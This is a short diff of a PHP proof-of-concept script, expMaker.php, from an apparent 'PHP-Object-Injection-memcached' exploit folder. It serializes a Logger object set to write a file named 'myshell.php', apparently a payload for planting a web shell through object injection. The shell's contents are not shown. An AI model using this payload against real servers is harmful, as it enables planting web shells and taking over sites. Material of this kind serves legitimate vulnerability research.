@@ -1,3 +1,4 @@
+root@impact:/home/ritz/PHP-Object-Injection-memcached/poc# cat expMaker.php
 <?php
 require("logger.php");
 $file = 'myshell.php';
@@ -6,3 +7,4 @@ $o = new Logger($file, $data);
 echo serialize($o);
 exit();
 ?>
+
